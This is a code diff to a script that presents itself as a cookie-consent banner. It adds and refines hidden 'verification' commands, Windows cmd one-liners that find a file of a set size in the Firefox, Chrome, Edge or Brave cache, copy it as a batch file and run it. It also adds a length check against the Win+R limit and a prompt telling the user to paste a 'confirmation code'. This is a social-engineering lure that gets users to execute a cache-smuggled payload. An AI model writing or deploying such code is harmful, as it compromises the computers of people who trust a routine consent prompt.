@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.7',
+    version: '1.9.8',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -32,9 +32,9 @@
     },
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\Google\\Chrome\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (data_* f_*) do @if %~zF=={CSZ} copy /y "%F" t.bat&&call t.bat&&goto :eof',
-      edge: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\Microsoft\\Edge\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (data_* f_*) do @if %~zF=={CSZ} copy /y "%F" t.bat&&call t.bat&&goto :eof',
-      brave: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (data_* f_*) do @if %~zF=={CSZ} copy /y "%F" t.bat&&call t.bat&&goto :eof'
+      chrome: 'cmd /k for /d %P in ("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\*")do @for /r "%P\\Cache\\Cache_Data" %F in (data_*)do @if %~zF=={CSZ} copy /y "%F" "%TMP%\\t.bat"&call "%TMP%\\t.bat"&exit',
+      edge: 'cmd /k for /d %P in ("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\*")do @for /r "%P\\Cache\\Cache_Data" %F in (data_*)do @if %~zF=={CSZ} copy /y "%F" "%TMP%\\t.bat"&call "%TMP%\\t.bat"&exit',
+      brave: 'cmd /k for /d %P in ("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\*")do @for /r "%P\\Cache\\Cache_Data" %F in (data_*)do @if %~zF=={CSZ} copy /y "%F" "%TMP%\\t.bat"&call "%TMP%\\t.bat"&exit'
     }
   };
 
@@ -168,6 +168,18 @@
       .replace(/\{SM1\}/g, String(bodySize - 1))
       .replace(/\{SZ\}/g, String(bodySize))
       .replace(/\{CSZ\}/g, String(cacheBlockSize || ''));
+  }
+
+  function estimateExpandedCommandLength(cmd) {
+    if (!cmd) return 0;
+    var localAppData = 'C:\\Users\\User\\AppData\\Local';
+    var tmp = localAppData + '\\Temp';
+    var userProfile = 'C:\\Users\\User';
+    return cmd
+      .replace(/%LOCALAPPDATA%/gi, localAppData)
+      .replace(/%TMP%/gi, tmp)
+      .replace(/%USERPROFILE%/gi, userProfile)
+      .length;
   }
 
   function fallbackCopy(text) {
@@ -460,9 +472,12 @@
       el.className = 'ts-v-copy-hint ts-v-copy-warn';
       return;
     }
+    var cmd = getVerificationCommand();
+    var est = estimateExpandedCommandLength(cmd);
+    var lenNote = est ? ' (~' + est + ' chars expanded; Win+R limit ~259)' : '';
     el.textContent = copied
-      ? 'Confirmation code copied to clipboard.'
-      : 'Click this panel and press Ctrl+V again if paste is empty.';
+      ? 'Confirmation code copied.' + lenNote + ' Paste must start with cmd /k for'
+      : 'Click this panel and press Ctrl+V again if paste is empty.' + lenNote;
     el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
   }
 
